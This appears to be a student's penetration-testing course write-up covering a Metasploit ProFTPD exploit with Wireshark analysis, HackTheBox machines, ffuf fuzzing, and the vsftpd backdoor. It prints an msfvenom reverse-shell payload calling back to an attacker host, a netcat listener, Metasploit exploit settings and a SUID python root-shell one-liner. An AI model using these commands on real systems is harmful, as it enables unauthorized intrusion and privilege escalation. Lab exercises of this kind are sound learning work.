X) Read and Summarize: A few bullet points are enough.

Popov 2024: Hacktricks: Wireshark Tricks
Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf
A) Choose an Attack: Select a ready-made attack that works on a local target, like Metasploitable, and demonstrate its functionality.

Normal option: Use an attack from Metasploit (not vsftpd backdoor).
Easier option: vsftpd backdoor from Metasploit (covered in class).
Harder option: Find an attack in exploitdb using searchsploit.
B) Source: Explain and analyze the functionality of your chosen attack from the source code.

C) Sniff Sniff: Explain and evaluate the behavior of your chosen attack using a network sniffer. Consider the visibility of the attack or control channel on the network.
(Optional bonus: include a pcap file of your recording).

D) Fuzz: Solve dirfuz-1 from Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf.

E) HackTheBox: Solve 1-2 machines on HackTheBox. Choose machines suitable to your skill level.

Optional

F) Easy: Change the default editor in Metasploit to micro using the setg setting.
G) Install and Solve FuffMe: Install the FuffMe practice target and complete its exercises (Karvinen 2023: Fuffme - Install Web Fuzzing Target on Debian).
H) Analyze Remote Access Enhancement: Use a sniffer to analyze how session upgrade (session -u 1) works in the vsftpd backdoor attack.
I) Hard: Find the vsftpd backdoor in its source code.

<a name="fuzzing-with-ffuf"></a>
#### 🔍 Fuzzing with ffuf

Fuzzing is similiar to brute forcing but we are not cracking hashes but finding directories, commands, subdomains etc. on websites.

ffuf is considered the fastest fuzzing tool currently.

More about this in tasks below

<a name="a-choose-an-attack"></a>
## 🎯 A) Choose an Attack

Some failed/wip attempts:
<details>

Decided to try to find another attack on metasploitable3

![alt text](imagesh3/image-17.png)

whats CUPS?

![alt text](imagesh3/image-18.png)

copy the attack python code from exploitdb

https://www.exploit-db.com/exploits/41233

![alt text](imagesh3/image-19.png)

create payload, using port 5555

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.104 LPORT=5555 -f elf > /tmp/x86reverseshell.so
```

![alt text](imagesh3/image-20.png)

listening on port 5555
```
nc -lvnp 5555
```

Cant get script to work, moving on



Browsing the server http side, lets look at /drupal

source code shows its running drupal 7

![](imagesh3/image-21.png)

give up, return later..


</details>


### Searching proftp in msfconsle

found potential exploit for proftpd, spent some time looking into configs. could not get it to work

```
show options
```

![alt text](imagesh3/image-23.png)

after setting correct SITEPATH the exploit works

```
use unix/ftp/proftpd_modcopy_exec

set RHOST 192.168.56.105

set LHOST 192.168.56.104

set LPORT 5665

set SITEPATH /var/www/html
```

![alt text](imagesh3/image-22.png)

```run``` to start exploit, after inside, i test with commands whoami and touch testi3.txt

          'nobody' user. By using /proc/self/cmdline to copy a PHP payload to the website

## 🌐 C) Network Sniffing the attack

Starting record on eth0 in wireshark, running the above exploit in msfconsole, waiting for session to open. run whoami and touch testi3.txt, end recording.

![alt text](imagesh3/image-28.png)

Follow TCP on the traffic to ip ending 105, blue text is response, red is sent.

### first stream

![alt text](imagesh3/image-29.png)

Checking host and shipping payload

- ftp banner return
- site cpfr copies payload to tmp file
- specify destination payload file in /tmp
- site cpfr, copy the payload
- site cpto, move payload to webdir (SITEPATH)



### Second stream:

![alt text](imagesh3/image-30.png)

- Run payload

### Third stream for running payload and opening session, blue text is sent packet, red response.

![alt text](imagesh3/image-27.png)


- first echo parts to verify connection/access?

- second part for running the exploit inside SITEPATH
- chekc its working?

- third part dleting payload

- session active, whoami with response, touch testi3.txt

## 🔒 E) HackTheBox Challenge

Starting point tier 0 and tier 1 free machines completed

![alt text](imagesh3/image-35.png)

![alt text](imagesh3/image-34.png)

Going for lab machine

#### Cap machine

![alt text](imagesh3/image-46.png)

this is a guided target, with several tasks. no hints used

![alt text](imagesh3/image-48.png)

already have too much stored in metasploit db, starting with fresh workspace

![alt text](imagesh3/image-47.png)

to complete first task i run `nmap -sV 10.10.10.245`

3 ports open

![alt text](imagesh3/image-49.png)

next task is to enter the web browser and run a "security napshot" and enter the directory data

![alt text](imagesh3/image-50.png)

Next task is to find other users pcap files, and find a pcap with vulnerable data. went through data/1-10 nothing good found, then entered data/0 found pcap file with a tcp stream to ftp

![alt text](imagesh3/image-51.png)

going into ftp downloading intresting file

![alt text](imagesh3/image-52.png)

![alt text](imagesh3/image-53.png)

found first flag, next task is to get root access

also downloaded lpe.sh from target, looks intresting i want to run it on the target.

Logging in with nathans credentials with ssh

![alt text](imagesh3/image-54.png)

![alt text](imagesh3/image-55.png)

the tool seems very useful showing lots of possible vulnerabilities

one big red flag found:

![alt text](imagesh3/image-56.png)


starting root shell with suid binary

```
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

![alt text](imagesh3/image-57.png)

Found root flag


![alt text](imagesh3/image-58.png)

#### Greenhorn machine

![alt text](imagesh3/image-67.png)

nmap shows following:

![alt text](imagesh3/image-68.png)

lets go see what http side has open

![](imagesh3/image-69.png)

its redirecting to dns greenhorn.htb, after adding it to etc/hosts the site works, had similiar task in ffufme so i think i should fuzz this host

![alt text](imagesh3/image-70.png)

while fuzz is running ill take a bite at the login

![alt text](imagesh3/image-71.png)

sql injections are not working, fuzzing meanwhile found some .htaccess files

tried to open them, no luck. tried to access other files with BAD LUCK

![alt text](imagesh3/image-72.png)

Going back to nmap, noticed port :3000 is also open at php DUH!

*Continuing task next day 14.11*

After going around the files in the :3000 git page, found pass.php. it seems to be encrypted.. 

![alt text](imagesh33/image-3.png)

login.php had some more info about the hash

![alt text](imagesh33/image-4.png)

seems to be encrypted in sha512. trying to crack the password, source code also shows that it has some protection for bruteforce attempts, but we have the hash so we can do it offline.

![alt text](imagesh33/image-5.png)

found pw to pluck site, now lets see where it gets us.

previously did some searchsploit on pluck and found possible vulnerabilities 

![alt text](imagesh33/image-6.png)

for more info about the RCE `searchsploit -m 51592.py`

https://www.exploit-db.com/exploits/51592

ended up using the code from here: https://github.com/thefizzyfish/CVE-2023-50564-pluck

had to setup venv and download requests+requests_toolbelt with pip

![alt text](imagesh33/image-7.png)

got access

![alt text](imagesh33/image-8.png)

trying some stuff, no visible password, cant access shadows, cant seem to find useful stuff manually

![alt text](imagesh33/image-9.png)

found user flag in junior homedir

![alt text](imagesh33/image-14.png)


moving session from netcat to metasploit 

```
use exploit/multi/handler
set LHOST 10.10.14.230
set LPORT 6112
```

then running the payload again, now with port 6112

![alt text](imagesh33/image-10.png)

upgrading to meterpreter

![alt text](imagesh33/image-11.png)

using post module local exploit suggester to automate local recon

![alt text](imagesh33/image-12.png)

found some more exploits:

![alt text](imagesh33/image-13.png)

trying dirtypipe exploit https://www.rapid7.com/db/modules/exploit/linux/local/cve_2022_0847_dirtypipe/

to be continued.




#### Chemistry machine

![alt text](imagesh3/image-59.png)

starting with nmap

![alt text](imagesh3/image-60.png)

port 5000 is intresting, what could it be?

browsed some exploits about port 5000 upnp, tried some but didnt work out of the box, 

![alt text](imagesh3/image-61.png)

doing more research..

found http up on port 5000

![alt text](imagesh3/image-62.png)

![alt text](imagesh3/image-63.png)

sql injections not working, but i can register an account and login

## 🛠️ G) Optional: Install and Solve FuffMe

### Setup target

Fuffme 
http://ffuf.me/
 https://terokarvinen.com/2023/fuffme-web-fuzzing-target-debian/

Installing the target docker

![alt text](imagesh3/image.png)

cloning repo and building 

![alt text](imagesh3/image-1.png)

running the container, curl to see that its up

![alt text](imagesh3/image-2.png)

### Basic ffuf

Most basic form of fuzzing a dir

```
ffuf -w ~/wordlists/common.txt -u http://127.0.0.1/cd/basic/FUZZ
```

`-w` wordlist 
`-u` host/address with **FUZZ** to indicate what part we fuzz

![alt text](imagesh3/image-3.png)

Found class and development.log

### Recursion ffuf

`-recursion` enables recursive fuzz, if directory is found it scans inside the found folder also

```
ffuf -w ~/wordlists/common.txt -recursion -u http://ffuf.me/cd/recursion/FUZZ
```

![alt text](imagesh3/image-5.png)

We initiated fuzz in /recursion/ directory. ffuf finds admin dir, and recursively users dir + users/96

### Content discovery

`-e` enables extension types to be added to fuzz example `-e .php,.txt`

![alt text](imagesh3/image-6.png)

Found *users.log* in log dir

### Result filtering by size

For getting more accurate and faster results, we can filter the result by response sizes, first doing normal fuzz

```
ffuf -w ~/wordlists/common.txt -u http://localhost/cd/no404/FUZZ
```

We get a huge list of results

![alt text](imagesh3/image-7.png)

now we want to hide the status 200 with size 669, since they are false hits. we use the -fs command

```
ffuf -w ~/wordlists/common.txt -u http://localhost/cd/no404/FUZZ -fs 669
```

![alt text](imagesh3/image-8.png)

**Found** secret

### Param mining

Fuzzing for parameters with specific wordlists

```
ffuf -w ~/wordlists/parameters.txt -u http://localhost/cd/param/data?FUZZ=1
```
![alt text](imagesh3/image-9.png)

found debug param

### Rate limiting

Avoid getting banned or flagged for too many actions by limiting the fuzzing speed

```
ffuf -w ~/wordlists/common.txt -t 5 -p 0.1 -u http://ffuf.test/cd/rate/FUZZ -mc 200,429
```
`-p 0.1` adds 0.1 sec pause inbetween requests

![alt text](imagesh3/image-10.png)

**Found** oracle

### Pipes

Custom FUZZing with | pipes |

```
seq 1 1000 | ffuf -w - -u http://localhost/cd/pipes/user?id=FUZZ
```
fuzzes with numbers 1-1000

there are so many packets, seems hard to read. trying to filter something out

maybe length 66 packets are just for connection?, ill filter those out

`tcp.stream eq 1 && frame.len > 66`

wireshark can show what part of packets are ports and ips etc, but the datapart needs to be decoded? stopped here

## 🔓 I) Optional, Hard: Find vsftpd Backdoor in Source Code

Already read some of the spoilers to this during class last week.

According to some sources the backdoor was "unintentionally" added

https://westoahu.hawaii.edu/cyber/forensics-weekly-executive-summmaries/8424-2/

the backdoor code:

the ```else if``` section contains 0x3A & 0x29 those are ":" ")"

if smiley face found in username, it runs function vsf_sysutil_extra();, 

vsf_sysutil_extra

![alt text](imagesh3/image-66.png)

this function opens the backdoor on port 6200
